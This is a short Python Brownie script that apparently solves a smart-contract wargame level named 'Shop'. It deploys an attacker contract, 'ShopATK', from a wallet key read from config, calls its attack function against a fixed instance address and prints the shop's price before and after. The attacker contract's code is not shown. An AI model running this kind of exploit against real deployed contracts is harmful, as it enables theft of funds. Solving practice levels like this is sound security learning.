from brownie import Shop, config, accounts, ShopATK
InstanceAddress = "0x54DB64528c4562f5589460bD7992Be7983A3A956"
player = accounts.add(config["wallets"]["from_key"]) 
shop = Shop.at(InstanceAddress)
def main():
    shopATK = ShopATK.deploy({"from": player})
    print(f"price: {shop.price()}")
    tx = shopATK.atk(InstanceAddress, {"from":player})
    print(f"price: {shop.price()}")